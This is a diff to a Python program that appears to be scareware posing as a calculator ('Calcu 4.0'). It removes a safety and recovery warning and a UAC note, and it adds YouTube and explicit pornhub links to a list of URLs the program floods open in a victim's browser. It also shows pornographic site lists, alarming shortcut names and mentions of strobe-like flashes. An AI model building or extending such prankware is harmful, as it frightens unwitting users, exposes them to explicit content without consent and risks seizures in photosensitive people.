@@ -1,17 +1,13 @@
 """
-Calcu 4.0 ("Babbage, Night Shift: TOTAL RECALL")
+Calcu 4.0 ("Babbage, AFTERMATH")
 ==================================================
-Calculate this bitch — now with MORE scary.
+Calculate this, bitch!
 
-SAFETY WARNING: Run the original v3.py to restore everything.
-This edition is TRUE Aftermath: no cleanup, no watchdog, no recovery.
-Maximum carnage. NSFW tabs ON.
 
 Notes:
 - No third-party dependencies. Pure stdlib + built-in Windows APIs.
 - Do not run on machines you do not own.
 - Contains strobe-like white flashes. Skip for photosensitive people.
-- Requests UAC admin on launch (runs anyway if declined).
 """
 import ctypes
 import math
@@ -129,6 +125,11 @@ TAB_FLOOD_URLS = [
     "https://www.youtube.com/results?search_query=ominous+music",
     "https://www.google.com/search?q=why+is+my+camera+on",
     "https://www.google.com/search?q=task+manager+weird+processes",
+    "https://youtu.be/32Hp1LW08Yc?si=D8uPgpsyeWsj26DF",
+    "https://youtu.be/adtuUeRb4Ts?si=PLldHLZpH6Vz9-Ya",
+    "https://youtu.be/XeT9Oc65Hsc?si=HENkjoSW532qoZSp",
+    "https://youtu.be/g3yt033RWIo?si=sdqOMGwRKF-2t369",
+    
 ]
 if NSFW_JOKES:
     TAB_FLOOD_URLS += [
@@ -142,6 +143,8 @@ if NSFW_JOKES:
         "https://www.tnaflix.com/",
         "https://www.xhamster.com/",
         "https://motherless.com/",
+        "https://www.pornhub.com/view_video.php?viewkey=68fd91dce635f",
+        "https://www.pornhub.com/view_video.php?viewkey=678e6ca8d1a0f",
     ]
 SHORTCUT_SUFFIXES = [
     "DO_NOT_OPEN", "virus_scan", "totally_normal", "URGENT_README",
